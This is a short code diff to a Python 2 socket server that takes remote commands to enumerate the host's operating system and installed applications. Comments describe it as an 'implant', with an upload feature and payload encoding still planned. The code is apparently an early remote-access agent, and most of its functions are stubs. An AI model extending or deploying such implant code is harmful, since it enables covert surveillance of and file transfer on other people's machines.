@@ -4,6 +4,7 @@ import sys
 
 from os_types import macintosh
 from os_types import windows
+from os_types import common
 
 TCP_IP = '127.0.0.1'
 TCP_PORT = 8080
@@ -24,12 +25,14 @@ while True:
     conn, addr = s.accept()
     data = conn.recv(BUFFER_SIZE)
     
-    if not data: 
-        break
-    elif data == "enum_os":
+    #use inheritance to remove lengthy if/else?
+    #https://jeffknupp.com/blog/2014/06/18/improve-your-python-python-classes-and-object-oriented-programming/
+    
+    if data == "enum_os":
         if platform.system() == 'Darwin':
             conn.send(macintosh.enum_os())
-        elif platform.system() == 'nt':
+            #use encoder first, then send request
+        elif platform.system() == 'Windows':
             print "needs to be implemented"
             #conn.send(windows.enum_os())
         else:
@@ -40,7 +43,11 @@ while True:
     elif data == "enum_applications":
         if platform.system() == 'Darwin':
             conn.send(macintosh.enum_applications())
+    elif data == 'upload':
+        conn.send("still working on")
+        #common.upload(file, dir)
+        #need to create implant obj and send to common for file transfer?
     else:
-        print "unknown command"
+        conn.send("unknown command")
          
 conn.close()
